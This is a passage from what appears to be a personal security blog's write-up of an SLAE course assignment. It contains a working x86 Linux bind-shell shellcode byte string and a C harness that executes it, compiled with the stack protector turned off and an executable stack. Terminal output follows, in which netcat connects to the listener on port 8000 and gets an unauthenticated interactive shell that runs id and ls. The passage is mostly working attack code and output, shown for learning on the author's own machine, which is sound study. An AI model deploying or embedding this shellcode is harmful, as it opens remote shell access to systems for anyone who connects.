"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x31\xdb\x89\xc3\x66\xb8\x69\x01\x56\x66\x68\x1f\x40\x66\x6a\x02\x89\xe1\xb2\x10\xcd\x80\x66\xb8\x6b\x01\x31\xc9\xcd\x80\x66\xb8\x6c\x01\xcd\x80\x89\xc3\xb1\x03\x31\xc0\xb0\x3f\xcd\x80\x49\x79\xf7\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}

{% endhighlight %}

Compile the shellcode.c and run it:
{% highlight js %}
kali@kali:~/Desktop/SLAE-Assignments/assignment1$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
kali@kali:~/Desktop/SLAE-Assignments/assignment1$ ./shellcode 
Shellcode Length:  96

{% endhighlight %}

Nmap Result: 

{% highlight js %}
kali@kali:~$ sudo nmap -p- 127.0.0.1 -vv
Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-28 00:15 EDT
Initiating SYN Stealth Scan at 00:15
Scanning localhost (127.0.0.1) [65535 ports]
Discovered open port 8000/tcp on 127.0.0.1
Completed SYN Stealth Scan at 00:15, 0.90s elapsed (65535 total ports)
Nmap scan report for localhost (127.0.0.1)
Host is up, received localhost-response (0.0000050s latency).
Scanned at 2020-08-28 00:15:49 EDT for 1s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT     STATE SERVICE  REASON
8000/tcp open  http-alt syn-ack ttl 64

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
Raw packets sent: 65535 (2.884MB) | Rcvd: 131071 (5.505MB)
{% endhighlight %}

{% highlight js %}
kali@kali:~$ nc 127.0.0.1 8000
id 
uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),131(scanner)
ls
Screenshot 2020-08-22 17:43:09.png
Screenshot 2020-08-22 17:50:02.png
Screenshot 2020-08-23 15:15:33.png
Screenshot 2020-08-27 16:44:35.png
Screenshot 2020-08-27 16:45:03.png
Screenshot 2020-08-27 16:45:41.png
Screenshot 2020-08-27 16:46:07.png
Screenshot 2020-08-27 16:49:13.png
Screenshot 2020-08-27 16:53:42.png
Screenshot 2020-08-27 16:53:57.png
Screenshot 2020-08-27 16:54:42.png
Screenshot 2020-08-27 23:52:20.png
bind_shell_libemu_result
bind_shell_tcp
bind_shell_tcp.nasm
bind_shell_tcp.o
bind_shell_tcp_graph.png
bind_tcp_shell
bind_tcp_shell.nasm
bind_tcp_shell.o
compile.sh
reverse.py
shellcode
shellcode.c
wrapper.py
{% endhighlight %}

![shellcode2](https://bohansec.com/assets/shellcode2.png "shellcode2")

You can find all the above code at [here](https://github.com/allan9595/SLAE-Assignments/tree/master/assignment1){:target="_blank"}.

Thanks for reading :)